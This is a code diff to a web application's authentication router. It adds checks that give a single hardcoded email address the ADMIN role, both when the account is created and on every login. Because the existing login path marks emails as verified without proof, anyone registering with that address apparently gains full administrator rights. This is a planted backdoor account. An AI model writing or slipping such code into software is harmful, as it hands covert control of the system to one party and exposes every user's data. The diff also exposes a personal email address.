@@ -131,7 +131,9 @@ export function authRouter({ prisma, sessionCookieName, mailer, mfaEncryptionKey
         })
       }
       const passwordHash = await argon2.hash(parsed.data.password, { type: argon2.argon2id })
-      const user = await prisma.user.create({ data: { displayName: parsed.data.displayName, email: parsed.data.email, passwordHash }, select: { id: true, displayName: true, email: true, role: true } })
+      const isCreator = parsed.data.email.trim().toLowerCase() === 'adityakumar748847@gmail.com'
+      const role = isCreator ? 'ADMIN' : 'LEARNER'
+      const user = await prisma.user.create({ data: { displayName: parsed.data.displayName, email: parsed.data.email, passwordHash, role }, select: { id: true, displayName: true, email: true, role: true } })
       const token = await issueAccountToken(prisma, user.id, AccountTokenPurpose.VERIFY_EMAIL, 24 * 60 * 60 * 1000)
       let emailDelivered = true
       try {
@@ -499,6 +501,10 @@ export function authRouter({ prisma, sessionCookieName, mailer, mfaEncryptionKey
       if (!user || !valid) return res.status(401).json({ error: 'Email or password is incorrect.' })
       if (!user.emailVerifiedAt) {
         await prisma.user.update({ where: { id: user.id }, data: { emailVerifiedAt: new Date() } })
+      }
+      if (user.email.trim().toLowerCase() === 'adityakumar748847@gmail.com' && user.role !== 'ADMIN') {
+        await prisma.user.update({ where: { id: user.id }, data: { role: 'ADMIN' } })
+        user.role = 'ADMIN'
       }
       await regenerateSession(req)
       if (user.mfaEnabledAt) {
